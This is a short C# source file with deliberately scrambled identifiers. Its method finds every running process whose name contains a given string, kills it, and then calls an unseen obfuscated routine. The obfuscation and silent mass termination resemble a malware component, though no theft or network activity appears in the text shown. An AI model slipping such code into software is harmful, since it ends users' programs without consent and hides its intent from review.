using System;
using System.Diagnostics;

namespace LSMgrTguKYchoUzfqQ;

public class XwkqGUVIbmhA
{
	public static bool DWInEfhdomTSBIyd(Process wqRMJLKXvbxJU, string qfDkDMrOWW)
	{
		try
		{
			return wqRMJLKXvbxJU.ProcessName.ToLower().Contains(qfDkDMrOWW.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void FPGxHZBsGUX(string bxDhtCOJnAR, string ybDCxgfTLsg)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (DWInEfhdomTSBIyd(process, bxDhtCOJnAR.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					VSCOSikLsIYu.PtvLsYuPhmTnEdYv();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
